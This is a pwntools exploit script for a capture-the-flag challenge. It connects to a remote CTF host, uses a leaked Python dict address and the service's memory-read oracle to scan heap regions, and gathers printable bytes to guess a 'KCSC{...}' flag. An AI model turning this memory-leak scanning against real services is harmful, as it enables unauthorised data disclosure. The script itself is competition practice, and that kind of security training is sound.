from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
dict_obj_addr = int(m.group(1), 16)
print(f'PyDictObject address: {hex(dict_obj_addr)}')

def read_memory(addr):
    addr_str = f"{addr:x}"
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    if 'illegal memory address' in line:
        return None
        
    parts = line.split(': ')
    if len(parts) >= 2:
        hex_data = parts[-1].strip()
        try:
            return bytes.fromhex(hex_data)
        except:
            return None
    return None

print("\n=== ULTIMATE FLAG HUNTING STRATEGY ===")

reads_used = 0
max_reads = 48

flag_chars = set()
found_locations = {}

# Strategy: Since the dict contains shuffled flag characters, and we know there are ~27 characters
# in a typical flag like KCSC{something_here}, let's scan very broadly

print("Scanning memory regions systematically...")

# Get baseline addresses 
ma_keys_data = read_memory(dict_obj_addr + 0x20)
reads_used += 1
ma_keys_ptr = u64(ma_keys_data)

# Define multiple scanning strategies
scan_strategies = [
    # Strategy 1: Dense scan around keys object
    ("Dense keys scan", ma_keys_ptr, 0x50, 0x400, 8),
    
    # Strategy 2: Broader heap scan  
    ("Heap region scan", ma_keys_ptr & ~0xfffff, 0x0, 0x50000, 0x100),
    
    # Strategy 3: Dict object vicinity
    ("Dict vicinity", dict_obj_addr, -0x1000, 0x2000, 0x20),
    
    # Strategy 4: High-frequency addresses (every 64 bytes)
    ("Systematic scan", ma_keys_ptr, -0x2000, 0x4000, 0x40),
]

for strategy_name, base_addr, start_off, end_off, step in scan_strategies:
    if reads_used >= max_reads - 5:
        break
        
    print(f"\n{strategy_name}: {base_addr + start_off:#x} to {base_addr + end_off:#x}")
    
    addresses_to_try = []
    for offset in range(start_off, end_off, step):
        addr = base_addr + offset
        if addr > 0x1000:  # Skip very low addresses
            addresses_to_try.append(addr)
    
    # Limit addresses per strategy to conserve reads
    addresses_to_try = addresses_to_try[:min(8, max_reads - reads_used - 3)]
    
    for addr in addresses_to_try:
        if reads_used >= max_reads - 2:
            break
            
        data = read_memory(addr)
        reads_used += 1
        
        if data:
            # Check for direct characters in the data
            for i, b in enumerate(data):
                if 32 <= b <= 126:
                    char = chr(b)
                    if (char.isalnum() or char in '{}_.,-!@#$%^&*()[]|\\:;"<>?/~`'):
                        flag_chars.add(char)
                        if char not in found_locations:
                            found_locations[char] = []
                        found_locations[char].append(addr + i)
            
            # Also check if this could be a pointer to more data
            ptr_val = u64(data)
            if (0x400000 < ptr_val < 0x800000000000 and 
                reads_used < max_reads - 1):
                
                # Try to read from the pointer
                ptr_data = read_memory(ptr_val + 0x28)  # Common string offset
                reads_used += 1
                
                if ptr_data:
                    chars = []
                    for b in ptr_data:
                        if 32 <= b <= 126:
                            chars.append(chr(b))
                        elif b == 0:
                            break
                    
                    if chars:
                        text = ''.join(chars)
                        for char in text:
                            if (char.isalnum() or char in '{}_.,-!@#$%^&*()'):
                                flag_chars.add(char)
                                if char not in found_locations:
                                    found_locations[char] = []
                                found_locations[char].append(ptr_val + 0x28)

print(f"\n=== COMPREHENSIVE RESULTS (used {reads_used}/{max_reads} reads) ===")

print(f"\nTotal unique characters found: {len(flag_chars)}")
sorted_chars = sorted(flag_chars)
print(f"Characters: {sorted_chars}")
print(f"Combined: {''.join(sorted_chars)}")

# Show where each character was found
print(f"\nCharacter locations:")
for char in sorted(found_locations.keys()):
    locations = found_locations[char][:3]  # Show first 3 locations
    loc_str = ', '.join(f"{loc:#x}" for loc in locations)
    print(f"  '{char}': {loc_str}")

# Flag analysis
flag_structure_chars = set('KCSC{}')
found_structure = flag_structure_chars & flag_chars
missing_structure = flag_structure_chars - flag_chars

print(f"\nFlag structure analysis:")
print(f"  Found: {sorted(found_structure) if found_structure else 'None'}")
print(f"  Missing: {sorted(missing_structure) if missing_structure else 'None'}")

# Try to construct flag regardless
if len(flag_chars) >= 10:
    all_chars_str = ''.join(sorted_chars)
    print(f"\nPossible flag combinations:")
    print(f"  All chars: {all_chars_str}")
    
    # If we have some structure chars, try to format properly
    if 'C' in flag_chars:
        if '{' in flag_chars and '}' in flag_chars:
            content_chars = [c for c in sorted_chars if c not in '{}']
            content = ''.join(content_chars)
            print(f"  Formatted: {{{content}}}")
            
            if 'K' in flag_chars and 'S' in flag_chars:
                remaining = [c for c in sorted_chars if c not in 'KCSC{}']
                flag_content = ''.join(remaining)
                print(f"  KCSC format: KCSC{{{flag_content}}}")

# Final recommendations
print(f"\nNext steps:")
if len(flag_chars) < 15:
    print("- More characters needed. Try manual scanning with larger ranges.")
    print(f"- Focus on regions around: {ma_keys_ptr:#x}")
    print("- Scan heap regions more systematically")
else:
    print("- Sufficient characters found! Try reconstructing the flag.")

print(f"\nFor manual exploration, try addresses around:")
print(f"  {ma_keys_ptr + 0x100:#x} to {ma_keys_ptr + 0x800:#x}")

io.close()